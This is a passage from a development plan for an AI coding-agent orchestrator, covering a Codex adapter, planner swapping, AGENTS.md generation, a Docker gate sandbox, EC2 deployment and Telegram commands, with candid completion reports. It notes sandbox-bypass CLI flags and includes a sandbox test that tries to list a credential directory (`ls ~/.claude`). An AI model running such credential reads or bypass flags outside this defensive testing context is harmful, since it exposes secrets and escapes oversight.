CLI is NOT currently installed on the dev machine):**
- Install `npm i -g @openai/codex`; auth via `codex login` (ChatGPT OAuth,
  browser flow) → credential file at `~/.codex/auth.json` (`CODEX_HOME`
  overrides `~/.codex`); `CODEX_API_KEY` is the per-token API-key
  alternative. For headless boxes the documented pattern is: log in on a
  browser machine, copy `auth.json` to the box ("treat like a password").
- Headless mode: `codex exec` — reads the prompt from **stdin** when given
  `-` (matches B7's stdin-not-argv pattern exactly).
- `--json` → JSONL event stream on stdout: `thread.started`,
  `turn.started/completed/failed`, `item.started/completed` (item types
  include agent messages, command execution, file changes), `error`. The
  `turn.completed` event carries `usage` with
  `input_tokens`/`cached_input_tokens`/`output_tokens`.
- `--output-last-message <path>` writes the final assistant message to a
  file (simplest robust way to capture `summary`).
- `-C/--cd <dir>` sets the working directory; `--skip-git-repo-check`
  exists but worktrees ARE git dirs so it shouldn't be needed — verify.
- Sandbox/approvals: `--sandbox read-only|workspace-write|
  danger-full-access`; also `--dangerously-bypass-approvals-and-sandbox`.
  For runner parity with the other two adapters (which run unsandboxed on
  the host), start with `--sandbox danger-full-access` so gates/deps/network
  behave identically across runners; note in a code comment that
  `workspace-write` is the better long-term default once F13's story
  covers agents (its default blocks network, which would break `npm
  install` mid-task). Verify which approval flag `exec` mode actually
  needs for fully unattended runs against the real CLI.
- **No cost-USD in the output** — subscription-billed. Be honest about it:
  `costUsd: 0`, real token counts from `usage`. Cost views will show $0 for
  codex runs (same as any subscription-side spend the app can't see);
  `ModelConfig.quota` (`maxRuns` + `windowHours`) is the right cap lever
  for a codex model and already works since F16 counts runs, not dollars.

**Fix:**
1. `@orc/types`: `RunnerKind` gains `"codex"`; `ModelConfig.codexModel?:
   string` (the `-m/--model` value, optional — omitted uses the CLI's
   default, mirroring `claudeModel`).
2. `@orc/adapters`: new `CodexAdapter` — spawn `codex exec - --json
   --output-last-message <tmpfile> -C <cwd>` + the sandbox/approval flags
   verified above, `-m` when `codexModel` set, prompt written to stdin,
   `env: sanitizedEnv({ PWD: opts.cwd })` (the same $PWD lesson as the
   other two adapters). Parse JSONL for token usage + stream lines to
   `opts.onLog`; read the last-message file for `summary`; map
   `turn.failed`/nonzero exit → `ok: false` and run the result through
   `classifyFailure` (check codex's real rate-limit phrasing against the
   CLI and extend the regex if needed). `makeAdapter` routes
   `runner === "codex"`.
3. `sanitizedEnv` allowlist: add `CODEX_API_KEY` and `CODEX_HOME` (the
   `/KEY/` denylist pattern currently strips both — same reasoning as the
   existing `ANTHROPIC_API_KEY` allowlist entry). Extend the S5 env test.
4. `setup.ts`: add a `Codex CLI (codex)` check (`codex --version`) to
   `runSetupChecks` — but only as a warn-grade entry when no model has
   `runner: "codex"` configured, so a claude/opencode-only setup doesn't
   show a red X for a CLI it doesn't use (match how the page presents it —
   simplest: include it with `ok: true, detail: "not configured"` when
   unused; don't fail `allOk` over an unused runner).
5. UI: ModelsEditor's runner select gains `codex`, with a `codexModel`
   field (placeholder `gpt-5.2-codex`) shown for that runner, mirroring
   the claude/opencode conditional fields.
6. Docs: USER_GUIDE gains a Codex subsection (install, `codex login`, the
   EC2 seed-auth.json pattern, the honest $0-cost note, quota-as-cap
   advice); `.env.example` mentions `CODEX_API_KEY` as the API-key
   alternative.

**Acceptance:** adapter unit test with a scripted child process is NOT
required (the other adapters don't have one) — instead: typecheck/build
green; S5 env test extended; setup check renders sanely with codex both
absent and installed; **live**: after the owner installs + logs in, a real
`codex exec` round-trip through the adapter (the F33 "Test models" button
is the cheapest full-path proof — add a codex model, test it, see its
self-ID reply + token counts + $0 cost), then one real easy task authored
end-to-end by a codex-runner model on a scratch repo (author → gates →
validator → merge), F29/F30-style.

### F37. Swappable planner runner (Claude Code ↔ Codex)

**Owner's ask:** the "interchange" above explicitly includes what Claude
Code does today beyond authoring — planning is Claude-only right now.

**What exists:** `packages/server/src/planner.ts` — `runClaudeJson`
(spawns `claude -p --output-format json`) with `runPlannerChat` /
`runPlannerDeconstruct` / `runPlanner` on top; `ENV.plannerChatModel` /
`plannerDeconstructModel` alias envs (`sonnet`/`opus`); `routing.planner`
already selects a model id, and `ModelConfig` already knows that model's
runner — the wiring just ignores it and always shells `claude`.

**Fix:**
1. `planner.ts`: introduce a runner dispatch — resolve `routing.planner`'s
   `ModelConfig`; `claude-code` → existing `runClaudeJson` unchanged
   (aliases still apply); `codex` → a `runCodexJson` twin using `codex
   exec - --json --output-last-message` (chat) and `--output-schema
   <file>` for deconstruct (codex can enforce the DAG JSON schema
   natively — write the JSON Schema for `PlanDeconstructResponse`'s
   task-array shape and let the CLI guarantee parseability; keep the
   existing lenient JSON-extraction fallback for the claude path
   unchanged). `opencode`-runner planners stay unsupported (400 with a
   clear message at the routes) — conversational planning quality is the
   point of the two subscription CLIs; don't silently degrade.
2. The planner cwd/attachments/session-file mechanics (F27/F28) are
   runner-agnostic already — they hand a prompt + cwd to whatever runs.
   Verify attachments still resolve for a codex planner (it has file tools
   and runs in the same clone cwd; the "Attached context files" block is
   plain prompt text).
3. UI copy: PlanView's "Chat with Claude" header and NewProject's "chat
   with Claude" sentence become the planner model's `displayName`
   (`models.find(id === routing.planner)`), falling back to "the planner".
   These are the only two hardcoded "Claude" strings on those pages —
   `grep -rn "Claude" apps/web/src` and fix any planning-flow ones.
4. Planner cost: codex reports no USD — record the planner cost row with
   `costUsd: 0` + real tokens (same honesty rule as F36; the F8 report
   card and Costs page just show what's recorded).

**Acceptance:** with a codex model routed as planner: a real chat turn, a
deconstruct that yields a valid editable task table (schema-enforced), and
a commit that materializes tasks — live on a scratch project. With claude
routed back: behavior byte-identical to today (existing planner tests /
mock flows unaffected). PlanView header names whichever model is routed.

### F38. AGENTS.md generation in the planning pipeline

**Owner's ask:** "add a structure like claude.md or agents.md so agents can
see what the structure of the app would be like, best practices, how to
code and such… Have claude/codex create that file when planning and
creating cards."

**Runner-facts that shape the design (verified 2026-07-08):** `AGENTS.md`
is the cross-tool convention — Codex CLI and opencode read it natively;
**Claude Code does NOT read AGENTS.md** (it reads `CLAUDE.md`; the
`@AGENTS.md` import inside CLAUDE.md is the official bridge —
anthropics/claude-code#34235 is the still-open feature request). So:
**AGENTS.md is the canonical generated file, plus a one-line committed
`CLAUDE.md` containing exactly `@AGENTS.md`** — every runner then sees the
same content natively, no duplication to drift.

**What exists to build on:** `/plan/commit` already writes the PRD into
the repo via `git.commitFile(project, prdPath, prdMarkdown, "docs: update
PRD (hoopedorc)")` (`index.ts` ~1452) — AGENTS.md rides the exact same
mechanism. `buildDeconstructPrompt` (planner.ts) already produces the
PRD + task JSON in one call.

**Fix:**
1. Deconstruct also produces the agents file: extend the deconstruct
   prompt to emit an `agentsMd` alongside `prdMarkdown` and `tasks` —
   contents: what the project is (one paragraph), the stack + target
   platform, the intended directory structure, the real commands
   (dev/test/build/lint — consistent with the scaffold task's gate
   scripts, per B11's standing scaffold instruction), coding conventions
   and best practices for THIS stack (the planner tailors to what's being
   built: a Next.js site, a browser extension, a Swift app…), and "how to
   work here" notes for agents (worktree/PR flow is Hoopedorc's own —
   keep the file about the project, not the orchestrator). Cap ~120 lines
   in the prompt instructions — this is a context file, not a book.
2. `PlanDeconstructResponse.agentsMd?: string` (+ CONTRACT.md + mock);
   PlanView shows it as a third editable artifact next to the PRD before
   commit (same textarea treatment as the PRD — it's operator-editable,
   per the owner's "we can figure it out together" instinct).
3. `/plan/commit` commits `AGENTS.md` (repo root) and — only when absent,
   never overwriting a hand-maintained one — the one-line `CLAUDE.md`
   pointer, alongside the existing PRD commit. Persist `agentsMd` on the
   planning-session row like `prd` so a reload mid-planning keeps it.
4. `buildAuthorPrompt` (orchestrator.ts) gains one standing line when the
   project's clone has an `AGENTS.md` at root: "Read AGENTS.md at the repo
   root before starting — it defines this project's structure and
   conventions." (A nudge, F34-style — codex/opencode/claude each also
   pick it up natively via their own discovery; the nudge covers the
   models that need prompting to actually read it.) Cheapest correct
   check: the orchestrator already knows `task.worktreePath` — check
   existence there at prompt-build time.
5. F30's docs stage: add `AGENTS.md` to the documenter's allowed scope
   (`revertOutOfScope`'s pattern list + the docs prompt's "touch only if
   wrong" list) so a merged change that alters project structure can keep
   the file current.
6. `USER_GUIDE.md`: a short "AGENTS.md — the project context file" section
   (what gets generated, that all three runners read it — Claude via the
   CLAUDE.md import line — and that it's editable both at plan time and as
   a normal committed file afterward).

**Acceptance:** unit: deconstruct response carries `agentsMd`; commit
writes both files (and does NOT clobber a pre-existing CLAUDE.md); author
prompt includes the nudge exactly when AGENTS.md exists (engine test with
a real temp worktree). Live, on a scratch project: plan → deconstruct
shows an editable AGENTS.md alongside the PRD → commit lands `AGENTS.md`
+ `CLAUDE.md` in the repo's first commits → a real authored task's prompt
carried the nudge, and the merged repo's AGENTS.md accurately names the
scaffold's real commands.

### F13-P1. Gates-only Docker sandbox (phase 1 of docs/specs/sandbox.md)

**Why now:** the owner settled the Docker-on-EC2 question (Docker is fine
on the box), and the deploy target is Linux, where the sandbox doc's
hardest problem (Claude auth in the macOS Keychain) doesn't exist. Phase 1
deliberately covers only the **repo-controlled code the host currently
runs unsandboxed**: gate scripts (`GateRunnerImpl`'s npm/execFile calls)
AND `WorktreeManager.ensureDeps`' `npm ci|install` (postinstall hooks are
repo code too — the sneakiest of the lot). Agents stay on the host (phase
2/3, future wave, per the spec doc).

**Where:** `packages/engine/src/gate-runner.ts`,
`packages/engine/src/worktree-manager.ts`, new
`packages/engine/src/sandbox.ts`; `@orc/types` Settings + ProjectConfig;
`packages/server/src/index.ts` (settings validation);
`ProjectConfigFields.tsx`; `docs/specs/sandbox.md` (update status),
USER_GUIDE.

**Fix:**
1. New `Settings.sandboxGates?: "off" | "auto" | "required"` (default
   `"auto"`) + `ProjectConfig.gateImage?: string` (default `node:22`,
   validated as a plausible image ref, ≤200 chars). `"auto"`: use Docker
   when the daemon responds, fall back to host with a warn-once log when
   it doesn't. `"required"`: no daemon → gates fail loudly (for the EC2
   box once proven). `"off"`: byte-identical to today.
2. New `sandbox.ts`: `detectDocker()` (cached `docker version` probe) and
   `sandboxedExecFile(image, cwd, cmd, args, opts)` building `docker run
   --rm -v <cwd>:/work -w /work --entrypoint <cmd> <image> <args…>` (or
   `sh -lc` composition if entrypoint routing proves awkward against the
   real CLI — verify). Network stays ON for phase 1 (`npm ci` needs the
   registry — the spec doc already flags this tension; the isolation win
   is the filesystem: the container sees ONLY the worktree, not $HOME,
   not the DB, not CLI credentials). Set `HOME=/tmp` inside the container
   and pass a minimal allowlist env (NODE_*, npm_config_*), NOT the
   host env — stricter than S5's host-side denylist, per the spec doc's
   two-layer note.
3. `GateRunnerImpl`: every place it currently `execFile`s npm or the
   `testCommand` goes through the sandbox runner when enabled (the
   `hasNpmScript` package.json checks are host-side reads and stay as-is).
   `ensureDeps`: same switch for its `npm ci|install`. Keep the existing
   timeout semantics; docker adds its own startup latency — bump the gate
   timeout by a fixed grace (e.g. +30s) only in sandboxed mode.
4. UI: a read-only line in Setup & Health ("Gate sandbox: docker
   (node:22) / host — docker not detected") so the operator can see which
   mode a box actually runs; the `gateImage` override lives in the
   Advanced accordion next to the gate script fields.
5. Docs: sandbox.md gets a "phase 1 shipped" status note; USER_GUIDE gains
   a short section (what's sandboxed and what isn't — be explicit that
   agents still run on the host; how to install Docker on the EC2 box;
   the `required` recommendation once verified there).

**Acceptance:** engine tests with a fake exec layer cover mode selection
(off/auto-with/auto-without/required-without daemon); **live on this Mac
(Docker Desktop or colima) or skipped-with-a-note if no daemon is
available locally** — a real gate run of the mock-seed scratch repo inside
`node:22`, confirming: pass/fail parity with host mode on the same repo, a
worktree-only mount (a gate script that tries `ls ~/.claude` or the DB
path fails), and the Setup line reporting the active mode. The EC2 box
verification happens during F39's deploy pass.

### F39. EC2 deploy checklist, prebuilt systemd start, Apple-split docs

**Why:** the owner deploys to EC2 immediately after this wave — this item
is the ship gate. Three concrete problems found reviewing the deploy
surface against that target:

1. **`ExecStart=/usr/bin/npm run start` rebuilds every workspace on every
   service (re)start** (`npm run start` = build + serve). On a small
   instance that's minutes of restart latency and a real OOM risk (vite +
   tsup builds on 1–2GB RAM). Fix: add a root `start:prebuilt` script
   (serve only, no build) and switch the unit to
   `ExecStart=… npm run start:prebuilt` with the build done by
   `npm run update` / initial setup instead; keep `npm run start` for dev
   convenience. Also add a commented `MemoryMax=` example and a note on
   adding swap for the build step on ≤2GB instances.
2. **No single ordered EC2 checklist** — the pieces all exist
   (USER_GUIDE's EC2/headless auth section, deploy/README's systemd steps,
   Tailscale section, backups, update flow) but a deploying user hops
   between five sections. Add a "Deploying to EC2 — checklist" section to
   USER_GUIDE that sequences them: instance sizing (≥2GB or swap; Node 22;
   git; docker for F13-P1), clone + `npm run setup`, the four CLI auths in
   order (`GH_TOKEN`, `claude setup-token`, opencode auth.json copy,
   codex auth.json copy — F36's section), `.env` (PORT/HOST/DB_PATH/
   API_TOKEN/DB_BACKUP_DIR), `tailscale serve`, systemd unit + enable,
   first-boot verification (Setup & Health all green, `journalctl -u
   hoopedorc -f` for logs), and where the DB/backups live.
3. **The Mac↔EC2 split needs one explicit rule.** Apple/Xcode projects
   can't build on Linux — the owner runs a second instance on the Mac for
   those. Document: **one project lives on exactly one box.** Two
   instances pointed at the same repo would both schedule/dispatch it —
   nothing deduplicates across servers (each has its own DB); that's by
   design, not a bug to fix this wave. A short "Two boxes: EC2 for
   web/extensions, your Mac for Apple targets" subsection covering: which
   projects go where, that Settings/models/budgets are per-box, and that
   the Telegram bot token can be shared (chat-id restricted) or split per
   box — recommend two bots so alerts name their origin.

**Acceptance:** `systemd-analyze verify` passes on the updated unit (or a
note if unavailable); a fresh-checkout dry run of the checklist's command
sequence on this Mac (through `npm run setup` + `start:prebuilt` serving
the built app) works as written; USER_GUIDE renders the checklist +
two-box section; deploy/README cross-links instead of duplicating.

### What Part 7 deliberately does NOT include (for calibration)

- **Agents in the sandbox (F13 phases 2–3)** — gates first, on purpose;
  agents keep host access this wave. Headline candidate for the next wave
  once phase 1 has run on the EC2 box for a while.
- **Multi-host orchestration** (EC2 delegating Apple builds to the Mac) —
  the owner chose the two-instances split; a remote-worker feature is a
  future architectural wave if the split chafes.
- **Cross-instance project dedup** — documented as a rule (F39) instead of
  built.
- **opencode-runner planners** (F37 supports the two subscription CLIs;
  API-billed opencode models stay author/validator-only).
- **Restyling beyond U15–U18** — the critique's verdict is the direction
  is right; resist drive-by polish.

---

## Part 8 — Remote-supervision wave (Fable, 2026-07-09)

**Context for the implementing model.** Produced from two inputs: (1)
Fable's audit of the merged Phase 12 code, and (2) the owner's requests on
2026-07-09, made while preparing the EC2 deploy. The owner deploys to EC2
**while this wave is being built** — every item here exists to make
supervising that box from a phone better, so live-verify against the real
Telegram bot where the acceptance criteria say so.

**Phase 12 audit verdict (all 10 items):** genuinely implemented, no
defects found. Sampled claims held up against the merged code: B28's
settings validation + both orchestrator requeue guards; F36's CodexAdapter
(stdin prompt, JSONL usage parse, `sanitizedEnv` allowlist extension);
F37's runner dispatch with `--output-schema`-enforced deconstruct; F38's
full `agentsMd` chain (planner prompt → JSON schema → parse → commit +
CLAUDE.md pointer → author nudge in `guidelines.ts` → docs-stage scope);
F13-P1's sandbox (allowlist env assembled from scratch, worktree-only rw
mount, read-only shared-deps mount, uid/gid mapping); F39/B29 verified in
the implementing session itself (B29 additionally against a real git
remote with a mid-run origin push). 139 tests green (81 engine / 54
server / 4 adapters). One benign interaction traced and accepted: B29's
manifest copy briefly dirties the primary clone's working tree, but git's
ff-merge tolerates a working-tree file that already matches the merge
target and the next `syncPrimary` self-heals it — worst case is a skipped
best-effort changelog/PRD commit. Also fixed during the audit session:
README/ARCHITECTURE were still describing v0.2.0 (refreshed, PR #107).

**Not an item: Grok 4.5.** Adding it to the coding/docs pool is pure
configuration — opencode reports per-step cost natively so no pricing
entry is needed. Owner: update the opencode CLI so `opencode models` lists
it, then Settings → Models (edit the slug or add a new entry — the add
field has the datalist), tick `hard`/`medium`/`docs` roles, point Routing
at it, optionally raise `maxConcurrent`/declare a quota, and round-trip it
with "Test models" before routing real work.

### B30. Restart during a pending approval re-runs the whole task — MEDIUM (efficiency + spend)

**Where:** `packages/engine/src/orchestrator.ts` (`start()`'s orphan
recovery, ~line 277, and the merge-decision section of `executeTask`),
`packages/server/src/engine-runner.ts` (`requestApproval`),
`packages/server/src/index.ts` (B10's `expireStaleApprovals` boot pass).

**Problem (confirmed by tracing the current code):** an approval pauses
only the flagged task — `requestApproval` returns an unresolved Promise
with no timeout, siblings keep flowing, and a Telegram tap resumes it.
That part is right. But if the **server restarts** while one is pending
(deploy, `npm run update`, crash, EC2 reboot): B10 stamps the notification
`expired_restart`; resume-on-boot restarts the project; orphan recovery
sees the task `in_review` with no active run and requeues it to `backlog`;
and the scheduler **re-runs the entire task from scratch** — a full paid
re-author + gates + validator cycle for work that had already passed
everything and was only waiting for a human tap. Wasteful exactly when the
owner is AFK, which is exactly when approvals sit pending.

**Fix:** teach orphan recovery to distinguish "was mid-authoring" from
"was awaiting a human." A task is resumable-at-decision when it is
`in_review` **and** has an open PR (`prNumber` set) **and** its newest
persisted `MergeDecision` exists for the current attempt. For those tasks,
instead of requeueing to `backlog`: re-enter the merge-decision step
directly — recompute `canAutoMerge` from the persisted decision (or re-run
the cheap risky-change checks; NOT the validator, whose verdict is already
persisted) and re-request approval via the normal `requestApproval` path,
producing a fresh notification with the same context (PR link + reasons).
Tasks that were genuinely mid-authoring keep the existing
requeue-to-backlog behavior unchanged. Keep B10's expiry for the *old*
notification exactly as is — the re-arm creates a new one; nothing ever
resolves against a dead resolver. Watch out: `executeTask` is one long
function — factor the decision step out far enough to re-enter it without
re-running gates, or gate re-running is acceptable if the factoring gets
ugly (gates are cheap relative to authoring; re-validating with a paid
model call is the thing to avoid — say which way you went in the PR).

**Acceptance:** engine test: a task seeded `in_review` with a `prNumber`
and a persisted passing `MergeDecision` + a risky flag → on `start()`, no
author adapter is ever invoked and `requestApproval` fires with the
persisted reasons; a task seeded `in_review` with no PR → requeues to
`backlog` exactly as today. Live: start a real risky-flagged task, kill
the server while its approval is pending, restart — a fresh approval
(same PR link) arrives on Telegram without the task re-authoring; approve
it and the merge completes.

**B30 — done (PR [#109](https://github.com/IngeniousArtist/hoopedorc/pull/109)).**
`findResumableDecision` (orchestrator.ts) recognizes an `in_review` task
with an open PR and a `MergeDecision` persisted for its current attempt
(`runId === run-<taskId>-<attempts>`) instead of treating it as orphaned.
`recoverPendingApproval` re-asks whichever decision was pending —
`request_changes`/`escalate` directly from the persisted reasons; an
`approve` verdict (the risky-change case the acceptance criteria
specifies) re-enters a new `resolveMergeOutcome` method, extracted
verbatim from `executeTask`'s post-validator tail (docs stage → sync →
optional GitHub-checks wait → `canAutoMerge` → merge-or-ask) so both the
normal path and recovery share one implementation — nothing here ever
re-runs the author or validator. New optional `SchedulerDeps.
getMergeDecisions` hook, wired in `engine-runner.ts`. Verified: 3 new
engine tests (approve+risky re-asks and completes the merge without
touching author/validator; escalate re-asks that verdict; no-PR still
requeues to backlog exactly as before) plus the full existing suite
unaffected by the extraction — 84/84 engine, 54/54 server, 4/4 adapters,
typecheck green. **Live-verified end-to-end** against a real scratch
GitHub repo with a real open PR (not Telegram specifically, since no bot
was configured in this environment — the notification-layer proof is
identical either way): seeded a task `in_review` with that PR number, a
real worktree, and a persisted risky "approve" decision; booted a real
`EngineRunner` against a real SQLite DB (simulating the restart);
confirmed zero run rows were created (no re-authoring) and the correct
"Risky changes..." notification appeared; resolved it `approve_merge` and
confirmed via `gh pr view` that the real PR was genuinely **MERGED** and
`CHANGELOG.md` landed on `origin/main`.

### F40. Telegram command wave

**Where:** `packages/server/src/index.ts` (`telegramCommand`, ~line 907 —
the switch is the only file to grow), `packages/server/src/telegram.ts`
(only if a new inline-keyboard shape is needed), `docs/USER_GUIDE.md`.

**What exists:** `/help /status /cost /projects /start /pause`, inline
approve/reject buttons on approval pushes, chat-id restriction on
everything, `resolveNotification` (index.ts ~859) for approvals,
`POST /api/engine/stop-all` (F23) and `POST /api/tasks/:id/retry` already
implement the hard parts — the commands are thin wrappers.

**Fix — add, reusing the existing route handlers' logic (extract shared
functions where a route body would otherwise be duplicated):**
1. `/autonomous on|off` — flips `Settings.mergePolicy` between
   `fully_autonomous` and `hard_gate_flag_risky`, persists via the same
   settings-update path the API uses (so validation runs), replies with
   the new policy and a one-line reminder of what it means. Bare
   `/autonomous` reports the current policy without changing it. Audit-log
   the change (`actor: "telegram"`).
2. `/pending` — lists open approval notifications (the repo query B26
   fixed already exempts them from pruning) and **re-sends each one** with
   its inline approve/reject keyboard, so a missed push is recoverable
   from the phone. Empty state: "Nothing pending."
3. `/stopall` — two-step: replies with an inline Yes/No keyboard naming
   how many projects/tasks it will stop; Yes runs the F23 stop-all logic.
   Never single-step — this is the highest-blast-radius command.
4. `/retry <taskId-or-prefix>` — retries a `failed`/`changes_requested`/
   `blocked` task via the existing retry logic; unique-prefix matching on
   the id with an "ambiguous, matches: …" reply when not unique.
5. `/digest off|terminal|all` — sets `Settings.telegram.digest`; bare
   `/digest` reports the current value.
6. `/health` — per-model one-liners: cooldown state, quota window usage
   (the F35 numbers), last model-check result. Keep it under ~15 lines.
7. Update `/help`, and USER_GUIDE's Telegram section, with all of these.

**Acceptance:** server tests for the command handlers where they're pure
(policy flip validates + persists + audit-logs; retry prefix matching
incl. the ambiguous case); live against the owner's real bot: each command
round-trips, `/stopall` requires the confirmation tap, `/pending` re-sent
approval buttons actually resolve, and an unauthorized chat id still gets
silence.

**F40 — done (PR [#111](https://github.com/IngeniousArtist/hoopedorc/pull/111)).**
New `packages/server/src/commands.ts` (index.ts boots a real server as a
side effect of being imported, so shared logic moved here instead, same
reasoning budget.ts/scheduler.ts are their own modules) exports
`stopAllProjects`, `retryTask`, `findTaskByIdPrefix`, `setMergePolicy`,
and `computeModelHealth` — all six commands plus the three existing HTTP
routes (stop-all, retry, model-health) now share one implementation each.
`TelegramBot` gained `confirmStopAll()` + a `stopall:` callback prefix in
`handleUpdate`, mirroring `approvalRequested`'s existing inline-keyboard
shape. Verified: 8 new server tests (policy flip persists + audit-logs
per project; prefix matching resolves/reports-no-match/lists-candidates-
when-ambiguous; `stopAllProjects`'s DB/broadcast/audit behavior against a
fake engine). 62/62 server, 84/84 engine, 4/4 adapters, typecheck green.
**No real Telegram bot was configured in this dev environment** (`.env`
had both `TELEGRAM_BOT_TOKEN`/`TELEGRAM_CHAT_ID` empty) — live-verified
as close to real as achievable instead: drove the actual `TelegramBot`
class's `handleUpdate` against real `commands.ts` functions, a real
`EngineRunner`, and a real in-memory DB, faking only the outbound
`api.telegram.org` `fetch` call. Confirmed the real Yes/No keyboard +
callback_data wire format; tapping No leaves everything untouched;
tapping Yes runs the real `stopAllProjects`/`engine.stopAll` pipeline
end to end; `/pending`'s re-sent approval carries the real
`appr:<id>:<option>` callback_data and genuinely resolves the
notification when tapped; an ambiguous `/retry` prefix lists every
match instead of guessing; an unauthorized chat id gets total silence.
**The owner should still round-trip each command against the real bot
once Telegram is configured** to confirm the Bot API itself behaves as
documented (message formatting, button rendering) — this verification
proves the server-side logic and wire format are correct, not that
Telegram's own UI renders them as expected.

### F41. Optional hold-dispatch while an approval is pending — LOW

**Where:** `packages/engine/src/orchestrator.ts` (dispatch loop),
`packages/server/src/engine-runner.ts` (a `SchedulerDeps` hook mirroring
`checkBudget`/`checkModelCooldown`), `packages/types` + Settings UI.

**Problem:** today a pending approval blocks only the flagged task. For an
owner who wants "nothing new happens while a decision is waiting on me,"
there's no mode for that — pausing the project by hand loses the queue.

**Fix:** `Settings.holdWhileAwaitingApproval?: boolean` (default `false`,
keep today's behavior). When true, the dispatch loop skips picking up new
`ready` tasks for a project while any unresolved approval notification
exists for it — active tasks finish naturally (drain semantics, like
F3's pause-drain), a warn-once log names the blocking notification, and
dispatch resumes the pass after it's resolved. Surface as a checkbox in
Settings near mergePolicy, with copy that says exactly what it trades
(slower overall runs for zero unsupervised spend during decisions).

**Acceptance:** engine test mirroring the budget-skip test's shape: with
the flag on and a pending approval, a second ready task is never
dispatched until the approval resolves, then dispatches on the next pass;
with the flag off, current behavior byte-identical.

**F41 — done (PR [#113](https://github.com/IngeniousArtist/hoopedorc/pull/113)).**
New `SchedulerDeps.getPendingApproval` hook (wired via a plain
`repo.getNotifications` query) plus a `pendingApproval` check added
alongside `draining` in the dispatch loop — both existing "nothing left
to do" break conditions needed updating too, since a naive fix would
have let the loop conclude while `activeTaskIds` was empty (the task
that raised the approval can be running under a *different* Orchestrator
instance, e.g. a manual dispatch, sharing the same project id). Settings
UI checkbox added to the Merge Policy section. Verified: 2 new engine
tests (held-then-resumes with exactly one warn log across all held
polls; flag-off leaves a permanently-"pending" fake hook unconsulted).
86/86 engine, 62/62 server, 4/4 adapters, typecheck green. Live-verified
the checkbox in a real browser (`npm run mock`): toggled, saved,
reloaded — round-tripped through `PUT /api/settings` with no unsaved-
changes state left over.

### F43. `sandboxGates` toggle in the Settings UI — TRIVIAL

**Where:** `apps/web/src/pages/Settings.tsx`.

USER_GUIDE's Gate sandbox section currently says "no UI toggle yet — set
via the settings API/DB directly." The field, validation, and health-panel
surfacing all exist (F13-P1); add a three-option select
(`off`/`auto`/`required`) with one line of help text per mode (crib the
USER_GUIDE wording), remove the "no UI toggle yet" caveat from the guide.

**Acceptance:** flipping the select and saving round-trips through
`PUT /api/settings`; Setup & Health's "Gate sandbox" line reflects the
change after the next gate run (or immediately, if it reads settings).

**F43 — done (PR [#115](https://github.com/IngeniousArtist/hoopedorc/pull/115)).**
No engine/server logic changed — the field, validation, and health-panel
surfacing all already existed from F13-P1; this was purely the missing
UI control. Live-verified in a real browser (`npm run mock`): the select
renders with "Auto (default)" and its matching help text; selecting
"Required" updates both together; Save + reload round-trips through
`PUT /api/settings` with no unsaved-changes state left over.

### F42. `deploy/ec2-bootstrap.sh` — one-command box setup

**Where:** new `deploy/ec2-bootstrap.sh`, cross-linked from USER_GUIDE's
EC2 checklist and `deploy/README.md`.

**Fix:** an idempotent bash script automating checklist steps 1–2 and 6
(the non-interactive parts): detect distro (support Amazon Linux 2023 +
Ubuntu LTS; refuse others with a pointer to the manual checklist), install
Node 22 + git + Docker (Docker optional behind a `--no-docker` flag), add
swap when RAM < 2GB (the F39 snippet), clone the repo to `/opt/hoopedorc`
(or `--dir`), `npm install && npm run setup && npm run build`, install the
systemd unit with `User=`/`WorkingDirectory=` filled in from the invoking
user, `daemon-reload` + `enable`. It must **stop and print next steps**
rather than attempt the interactive parts: the CLI logins (checklist step
3), `.env` editing (step 4), and `tailscale serve` (step 5). Re-running on
a half-configured box must be safe (check-before-install everywhere, the
B27 lesson: detect by output, not exit codes). Follow update.sh's existing
conventions (`set -euo pipefail`, explicit refusals).

**Acceptance:** shellcheck-clean; a dry-run mode (`--dry-run` printing the
commands it would run) exercised in CI or locally; live-verified on the
owner's actual EC2 instance during the deploy (this wave and the deploy
are concurrent — coordinate with the owner, who runs it with `! bash
deploy/ec2-bootstrap.sh` and pastes the output back).

**F42 — done (PR [#117](https://github.com/IngeniousArtist/hoopedorc/pull/117)).**
Cross-linked from USER_GUIDE's checklist and `deploy/README.md` instead
of duplicating the steps; enables but does not start the systemd unit
(starting before the interactive CLI-auth/`.env` steps would just crash-
loop). Verified: shellcheck-clean (installed shellcheck via brew
specifically to check — zero warnings, matching `scripts/update.sh`'s
own clean result). `--dry-run` exercised locally: the distro-refusal
path correctly fires on this Mac (no `/etc/os-release`); a scratch copy
with `DISTRO_ID` forced to `"ubuntu"` (plus a faked `free`/`swapon`,
neither of which exists on macOS) exercised the full path end to end —
Node/git/Docker checks, both the low-RAM (adds swap) and sufficient-RAM
(skips it) branches, clone/npm/systemd dry-run output, `--no-docker`,
`--help`, and unknown-option handling all produced correct output. **No
real EC2 instance or Docker daemon was available in this environment**
for a fully live run — this item's live half is still owed: the owner
should run it for real (`! bash deploy/ec2-bootstrap.sh`) during the
actual EC2 deploy and confirm.

### What Part 8 deliberately does NOT include (for calibration)

- **Agents in the sandbox (F13 phases 2–3)** — still the headline
  candidate for the wave after this one, once the gates sandbox has run
  on the EC2 box for a while.
- **Telegram free-text chat with the planner** — commands only; a
  conversational TG interface is a different product surface with real
  prompt-injection considerations (anyone who compromises the chat
  controls a code-pushing system).
- **Multi-user Telegram** — the chat-id restriction stays single-operator.
- **Approval timeouts / auto-decisions** — approvals wait forever by
  design; an auto-approve-after-N-hours would defeat the entire safety
  model.
- **Cross-instance anything** — the two-box rule stands.

---

## Part 9 — Autonomy-hardening wave (Fable, 2026-07-14)

**Context for the implementing model.** Produced from the owner's first
real dogfooding runs on the EC2 box (2026-07-14). Every item here is a
failure or safety gap the owner hit live, diagnosed by Fable against the
current `main` (post-#123). Two root causes are **confirmed by code
tracing**, not hypotheses: B31 (the fence regex in `extractJsonObject`)
and B32 (the dispatch loop's wind-down on cooldown/quota blocks). The
owner's goal is unchanged: Hoopedorc runs autonomously without
babysitting, but never does anything destructive. Suggested PR grouping:
B31+F46+F47 (all three live in `planner.ts` — one PR), then B32, then
S8, then B33, F44, F45 in any order.

### B31. Deconstruction fails on code fences inside the plan text — HIGH (breaks planning)

**Where:** `packages/server/src/planner.ts` (`extractJsonObject`, ~line
492; `parsePlanOutput`; `runPlannerDeconstruct`), plus a new unit test
file (or extend the existing planner tests).

**Problem (confirmed by tracing):** the owner hit
`deconstruction failed: Unexpected token '\', "\nprisma/"... is not valid JSON`.
Root cause: `extractJsonObject`'s fence regex
`/\`\`\`(?:json)?\s*([\s\S]*?)\`\`\`/` is **unanchored and non-greedy**.
When the claude-path planner correctly returns pure JSON (no outer
fences) but the `prd`/`agentsMd`/task-description *strings inside that
